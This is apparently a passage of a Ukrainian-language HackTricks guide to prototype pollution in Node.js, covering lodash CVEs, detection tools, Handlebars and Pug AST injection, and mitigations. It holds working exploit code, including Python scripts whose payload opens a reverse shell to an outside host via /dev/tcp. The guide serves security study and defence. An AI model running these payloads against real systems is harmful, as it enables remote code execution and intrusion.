–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ —è–∫ CVE-2019‚Äì11358, –ø–æ–∫–∞–∑—É—î, —è–∫ –≥–ª–∏–±–æ–∫–∞ –∫–æ–ø—ñ—è –º–æ–∂–µ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ –ø—Ä–æ—Ç–æ—Ç–∏–ø, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö –∑–∞–≥—Ä–æ–∑ –±–µ–∑–ø–µ—Ü—ñ, —Ç–∞–∫–∏—Ö —è–∫ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —è–∫—â–æ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `isAdmin`, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: –ê—Ç–∞–∫–∞ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É —á–µ—Ä–µ–∑ lodash

[–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü—é —Å—Ç–∞—Ç—Ç—é](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) —Å—Ç–∏–∫–∞–≤—Å—è –∑ –ø–æ–¥—ñ–±–Ω–∏–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É (CVE-2018‚Äì3721, CVE-2019‚Äì10744). –¶—ñ –ø—Ä–æ–±–ª–µ–º–∏ –±—É–ª–∏ –≤–∏—Ä—ñ—à–µ–Ω—ñ —É –≤–µ—Ä—Å—ñ—ó 4.17.11.

### –Ü–Ω—à–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫ –∑ CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): –†–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp Suite, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–µ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–Ω–∞–ª—ñ–∑—É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä–Ω–æ–º—É –±–æ—Ü—ñ —É –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î –ø—Ä–æ—Ü–µ—Å —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∑–∞–ø–∏—Ç—ñ–≤ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö –ø—Ä–æ–±–ª–µ–º –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤—ñ–¥–æ–º—ñ –≥–∞–¥–∂–µ—Ç–∏ - –º–µ—Ç–æ–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–∏—Ö –¥—ñ–π - –∑–æ–∫—Ä–µ–º–∞ –∑–æ—Å–µ—Ä–µ–¥–∂—É—é—á–∏—Å—å –Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö Node.js.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): –¶–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä–Ω–æ–º—É –±–æ—Ü—ñ. –í–æ–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ç–µ—Ö–Ω—ñ–∫–∏, –æ–ø–∏—Å–∞–Ω—ñ –≤ [–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—ñ –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä–Ω–æ–º—É –±–æ—Ü—ñ](https://portswigger.net/research/server-side-prototype-pollution).

### –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É AST –≤ NodeJS

NodeJS —à–∏—Ä–æ–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ê–±—Å—Ç—Ä–∞–∫—Ç–Ω—ñ –°–∏–Ω—Ç–∞–∫—Å–∏—á–Ω—ñ –î–µ—Ä–µ–≤–∞ (AST) –≤ JavaScript –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ —à–∞–±–ª–æ–Ω–Ω—ñ –¥–≤–∏–≥—É–Ω–∏ —Ç–∞ TypeScript. –¶–µ–π —Ä–æ–∑–¥—ñ–ª –¥–æ—Å–ª—ñ–¥–∂—É—î –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤ —à–∞–±–ª–æ–Ω–Ω–∏—Ö –¥–≤–∏–≥—É–Ω–∞—Ö, –∑–æ–∫—Ä–µ–º–∞ Handlebars —Ç–∞ Pug.

#### –ê–Ω–∞–ª—ñ–∑ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ Handlebars

–®–∞–±–ª–æ–Ω–Ω–∏–π –¥–≤–∏–≥—É–Ω Handlebars –ø—ñ–¥–¥–∞—î—Ç—å—Å—è –∞—Ç–∞–∫–∞–º –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π —É —Ñ–∞–π–ª—ñ `javascript-compiler.js`. –§—É–Ω–∫—Ü—ñ—è `appendContent`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î `pendingContent`, —è–∫—â–æ –≤–æ–Ω–æ –ø—Ä–∏—Å—É—Ç–Ω—î, —Ç–æ–¥—ñ —è–∫ —Ñ—É–Ω–∫—Ü—ñ—è `pushSource` —Å–∫–∏–¥–∞—î `pendingContent` –Ω–∞ `undefined` –ø—ñ—Å–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–∂–µ—Ä–µ–ª–∞.

**–ü—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó**

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î AST (–ê–±—Å—Ç—Ä–∞–∫—Ç–Ω–µ –°–∏–Ω—Ç–∞–∫—Å–∏—á–Ω–µ –î–µ—Ä–µ–≤–æ), —Å—Ç–≤–æ—Ä–µ–Ω–µ Handlebars, —Å–ª—ñ–¥—É—é—á–∏ —Ü–∏–º–∏ –∫—Ä–æ–∫–∞–º–∏:

1. **–ú–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –ü–∞—Ä—Å–µ—Ä–æ–º**: –°–ø–æ—á–∞—Ç–∫—É –ø–∞—Ä—Å–µ—Ä, —á–µ—Ä–µ–∑ –≤—É–∑–æ–ª `NumberLiteral`, –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ –∑–Ω–∞—á–µ–Ω–Ω—è —î —á–∏—Å–ª–æ–≤–∏–º–∏. –ó–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ —Ü–µ, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤—Å—Ç–∞–≤–ª—è—Ç–∏ –Ω–µ—á–∏—Å–ª–æ–≤—ñ —Ä—è–¥–∫–∏.
2. **–û–±—Ä–æ–±–∫–∞ –ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä–æ–º**: –ö–æ–º–ø—ñ–ª—è—Ç–æ—Ä –º–æ–∂–µ –æ–±—Ä–æ–±–ª—è—Ç–∏ –æ–±'—î–∫—Ç AST –∞–±–æ —Ä—è–¥–∫–æ–≤–∏–π —à–∞–±–ª–æ–Ω. –Ø–∫—â–æ `input.type` –¥–æ—Ä—ñ–≤–Ω—é—î `Program`, –≤—Ö—ñ–¥ –≤–≤–∞–∂–∞—î—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Ä–æ–∑—ñ–±—Ä–∞–Ω–∏–º, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–æ.
3. **–í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ö–æ–¥—É**: –®–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è `Object.prototype` –º–æ–∂–Ω–∞ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ —É —Ñ—É–Ω–∫—Ü—ñ—é —à–∞–±–ª–æ–Ω—É, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥—É.

–ü—Ä–∏–∫–ª–∞–¥, —â–æ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
–¶–µ–π –∫–æ–¥ –ø–æ–∫–∞–∑—É—î, —è–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ —É —à–∞–±–ª–æ–Ω Handlebars.

**–ó–æ–≤–Ω—ñ—à–Ω—î –ø–æ—Å–∏–ª–∞–Ω–Ω—è**: –ü—Ä–æ–±–ª–µ–º–∞, –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—É, –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ –≤ –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ 'flat', —è–∫ –æ–ø–∏—Å–∞–Ω–æ —Ç—É—Ç: [–ü—Ä–æ–±–ª–µ–º–∞ –Ω–∞ GitHub](https://github.com/hughsk/flat/issues/105).

**–ó–æ–≤–Ω—ñ—à–Ω—î –ø–æ—Å–∏–ª–∞–Ω–Ω—è**: [–ü—Ä–æ–±–ª–µ–º–∞, –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤ –±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ 'flat'](https://github.com/hughsk/flat/issues/105)

–ü—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª–æ–π—Ç—É–≤–∞–Ω–Ω—è –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤ Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Pug

Pug, —â–µ –æ–¥–∏–Ω —à–∞–±–ª–æ–Ω–Ω–∏–π –¥–≤–∏–≥—É–Ω, —Å—Ç–∏–∫–∞—î—Ç—å—Å—è –∑ –∞–Ω–∞–ª–æ–≥—ñ—á–Ω–∏–º —Ä–∏–∑–∏–∫–æ–º –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É. –î–µ—Ç–∞–ª—å–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –¥–æ—Å—Ç—É–ø–Ω–∞ —É –æ–±–≥–æ–≤–æ—Ä–µ–Ω–Ω—ñ –Ω–∞ [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

–ü—Ä–∏–∫–ª–∞–¥ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –≤ Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### –ó–∞–ø–æ–±—ñ–∂–Ω—ñ –∑–∞—Ö–æ–¥–∏

–î–ª—è –∑–º–µ–Ω—à–µ–Ω–Ω—è —Ä–∏–∑–∏–∫—É –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–∞–∫—ñ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó:

1. **–ù–µ–∑–º—ñ–Ω–Ω—ñ—Å—Ç—å –æ–±'—î–∫—Ç—ñ–≤**: `Object.prototype` –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –Ω–µ–∑–º—ñ–Ω–Ω–∏–º, –∑–∞—Å—Ç–æ—Å—É–≤–∞–≤—à–∏ `Object.freeze`.
2. **–í–∞–ª—ñ–¥–∞—Ü—ñ—è –≤–≤–µ–¥–µ–Ω–Ω—è**: JSON-–≤–≤–µ–¥–µ–Ω–Ω—è –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ —Ä–µ—Ç–µ–ª—å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–µ –Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å —Å—Ö–µ–º—ñ –¥–æ–¥–∞—Ç–∫–∞.
3. **–ë–µ–∑–ø–µ—á–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑–ª–∏—Ç—Ç—è**: –ù–µ–±–µ–∑–ø–µ—á–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π –∑–ª–∏—Ç—Ç—è —Å–ª—ñ–¥ —É–Ω–∏–∫–∞—Ç–∏.
4. **–û–±'—î–∫—Ç–∏ –±–µ–∑ –ø—Ä–æ—Ç–æ—Ç–∏–ø—ñ–≤**: –û–±'—î–∫—Ç–∏ –±–µ–∑ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `Object.create(null)`.
5. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Map**: –ó–∞–º—ñ—Å—Ç—å `Object` —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `Map` –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –ø–∞—Ä –∫–ª—é—á-–∑–Ω–∞—á–µ–Ω–Ω—è.
6. **–û–Ω–æ–≤–ª–µ–Ω–Ω—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫**: –ü–∞—Ç—á—ñ –±–µ–∑–ø–µ–∫–∏ –º–æ–∂–Ω–∞ –≤–Ω–µ—Å—Ç–∏, —Ä–µ–≥—É–ª—è—Ä–Ω–æ –æ–Ω–æ–≤–ª—é—é—á–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏.
7. **–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –ª—ñ–Ω—Ç–µ—Ä–∞ —Ç–∞ —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ ESLint –∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–º–∏ –ø–ª–∞–≥—ñ–Ω–∞–º–∏, –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É.
8. **–ü–µ—Ä–µ–≥–ª—è–¥–∏ –∫–æ–¥—É**: –ó–¥—ñ–π—Å–Ω—é–π—Ç–µ —Ä–µ—Ç–µ–ª—å–Ω—ñ –ø–µ—Ä–µ–≥–ª—è–¥–∏ –∫–æ–¥—É –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–∞ —É—Å—É–Ω–µ–Ω–Ω—è –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö —Ä–∏–∑–∏–∫—ñ–≤, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö —ñ–∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—É.
9. **–ù–∞–≤—á–∞–Ω–Ω—è –∑ –±–µ–∑–ø–µ–∫–∏**: –ù–∞–≤—á–∞–π—Ç–µ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤ –ø—Ä–æ —Ä–∏–∑–∏–∫–∏ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É —Ç–∞ –Ω–∞–π–∫—Ä–∞—â—ñ –ø—Ä–∞–∫—Ç–∏–∫–∏ –Ω–∞–ø–∏—Å–∞–Ω–Ω—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∫–æ–¥—É.
10. **–û–±–µ—Ä–µ–∂–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫**: –ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫. –û—Ü—ñ–Ω—é–π—Ç–µ —ó—Ö –±–µ–∑–ø–µ–∫–æ–≤–∏–π —Å—Ç–∞–Ω —Ç–∞ –ø–µ—Ä–µ–≥–ª—è–¥–∞–π—Ç–µ —ó—Ö –∫–æ–¥, –æ—Å–æ–±–ª–∏–≤–æ —Ç—ñ, —â–æ –º–∞–Ω—ñ–ø—É–ª—é—é—Ç—å –æ–±'—î–∫—Ç–∞–º–∏.
11. **–ó–∞—Ö–∏—Å—Ç –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –∑–∞—Ö–∏—Å—Ç—É –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–∞–∫–µ—Ç—ñ–≤ npm, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏—Ö –Ω–∞ –±–µ–∑–ø–µ–∫—É, —è–∫—ñ –º–æ–∂—É—Ç—å –≤–∏—è–≤–ª—è—Ç–∏ —Ç–∞ –∑–∞–ø–æ–±—ñ–≥–∞—Ç–∏ –∞—Ç–∞–∫–∞–º –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
